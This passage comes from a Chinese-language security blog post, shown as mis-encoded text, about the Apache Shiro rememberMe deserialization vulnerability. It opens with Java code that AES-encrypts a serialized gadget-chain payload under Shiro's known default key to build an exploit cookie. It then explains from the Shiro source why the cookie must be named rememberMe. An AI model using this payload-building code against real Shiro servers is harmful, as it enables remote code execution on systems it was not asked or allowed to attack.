</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span>  Exception{
</span></span><span style="display:flex;"><span>        String path = <span style="color:#0ff;font-weight:bold">&#34;/Users/reus09/Desktop/JavaSec/cc11.bin&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">byte</span>[] key = Base64.<span style="color:#007f7f">decode</span>(<span style="color:#0ff;font-weight:bold">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>);
</span></span><span style="display:flex;"><span>        AesCipherService aes = <span style="color:#fff;font-weight:bold">new</span> AesCipherService();
</span></span><span style="display:flex;"><span>        ByteSource ciphertext = aes.<span style="color:#007f7f">encrypt</span>(getBytes(path), key);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">printf</span>(ciphertext.<span style="color:#007f7f">toString</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ”»å‡»ï¼š<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319195735132.png" alt="image-20230319195735132"  />
</p>
<h3 id="æ¼æ´ç–‘æƒ‘">æ¼æ´ç–‘æƒ‘<a hidden class="anchor" aria-hidden="true" href="#æ¼æ´ç–‘æƒ‘">#</a></h3>
<p>è¿™é‡Œè®²ä¸€ä¸‹ä¸ºä»€ä¹ˆ<code>Cookie</code>çš„keyè¦ä¸º<code>rememberMe</code>ã€‚</p>
<p>åœ¨è°ƒç”¨è°ƒç”¨<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>æ–¹æ³•çš„æ—¶å€™ã€‚</p>
<p><code>CookieRememberMeManager</code>çš„æ„é€ å‡½æ•°ä¼šåˆå§‹åŒ–ä¸€ä¸ªç±»<code>SimpleCookie</code>ï¼Œæ¥å­˜å‚¨æˆ‘ä»¬ä¼ è¾“çš„Cookieçš„keyå’Œvalueã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319155407694.png" alt="image-20230319155407694"  />
</p>
<p>æ ¹æ®<code>SimpleCookie</code>çš„æ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>rememberMe</code>ä½œä¸ºå­—ç¬¦ä¸²ä¼ å…¥ï¼Œä½œä¸º<code>cookie</code>çš„nameã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319155605156.png" alt="image-20230319155605156"  />
</p>
<p>ç„¶ååœ¨<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>æ–¹æ³•ä¸­ä½¿ç”¨<code>org.apache.shiro.web.servlet.SimpleCookie#readValue</code>æ–¹æ³•æ¥æ ¹æ®åˆå§‹åŒ–ä¼ å…¥çš„name:<code>rememberMe</code>è¯»å–<code>request</code>è¯·æ±‚ä¸­çš„cookieï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œå°±å°†å…¶cookieå¯¹åº”çš„<code>value</code>è¿”å›ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319155845525.png" alt="image-20230319155845525"  />
</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æˆ‘ä»¬çš„base64è§£å¯†è¿‡ç¨‹ï¼Œå°±ä¸åœ¨èµ˜è¿°ã€‚</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">ååºåˆ—åŒ–æ¼æ´</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="/posts/tech/java%E5%AE%89%E5%85%A8-rmi/">
    <span class="title">Next Â»</span>
    <br>
    <span>JAVAå®‰å…¨ RMI</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
